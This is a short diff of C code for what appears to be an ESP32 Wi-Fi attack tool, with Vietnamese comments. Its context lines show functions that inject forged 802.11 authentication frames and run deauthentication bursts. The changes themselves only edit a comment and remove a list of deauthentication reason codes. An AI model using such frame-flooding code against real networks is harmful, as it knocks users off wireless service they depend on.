@@ -16,7 +16,7 @@ typedef struct __attribute__((packed)) {
     uint8_t ra[6];
 } cts_frame_t;
 
-// 2. Định nghĩa mảng 6 byte chuẩn xác cho các trường MAC
+// 2. Định nghĩa cấu trúc mảng byte chuẩn theo file gốc
 typedef struct __attribute__((packed)) {
     uint8_t frame_ctrl[2];
     uint8_t duration[2];
@@ -104,8 +104,6 @@ void frames_send_auth_flood(const uint8_t *bssid) {
     f.status[1]   = 0x00;
     esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
 }
-
-static const uint16_t REASONS[] = {0x0001, 0x0003, 0x0006, 0x0007, 0x0008};
 
 uint32_t frames_burst_deauth(uint8_t channel, const uint8_t *da, const uint8_t *bssid) {
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
